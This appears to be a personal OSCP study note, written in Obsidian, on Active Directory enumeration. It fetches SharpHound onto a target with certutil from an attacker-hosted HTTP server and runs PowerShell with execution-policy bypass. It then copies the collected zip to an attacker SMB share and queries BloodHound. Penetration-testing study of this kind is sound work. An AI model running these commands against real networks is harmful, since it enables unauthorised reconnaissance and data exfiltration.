
---

Host sharphound.ps1
```
cd ~/Desktop/Tools/Windows/Bloodhound && python -m http.server 80
```

Transfer sharphound.ps1 onto target victim
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpHound.ps1 SharpHound.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
powershell -ep bypass
```

```powershell
. .\SharpHound.ps1
```

```
Invoke-BloodHound -CollectionMethod All
```

Transfer the zip file back to KALI ATTACKER

On KALI ATTACKER
```
sudo impacket-smbserver share ~/Desktop/[path] -smb2support
```

On WINDOWS TARGET
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy C:\\Users\\Public\\sharphound.zip \\\\${KaliIP}\\share\ `;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Boot up Bloodhound

```
cd ~/Desktop/Tools/Windows/Bloodhound && sudo docker compose down -v
```

```
sudo docker compose up
```

```
localhost:8080
```

---

Kill Docker compose bloodhound

```
sudo docker comppose down -v
```

```
docker stop $(docker ps -q)
```
---

## Raw queries

```
MATCH (m:Computer) RETURN m
```

Listing 53 shows that the IP address for INTERNALSRV1 is 172.16.6.241. Let's add this information to **computer.txt** on our Kali machine.
```
nslookup INTERNALSRV1.BEYOND.COM
```

```
MATCH (m:User) RETURN m
```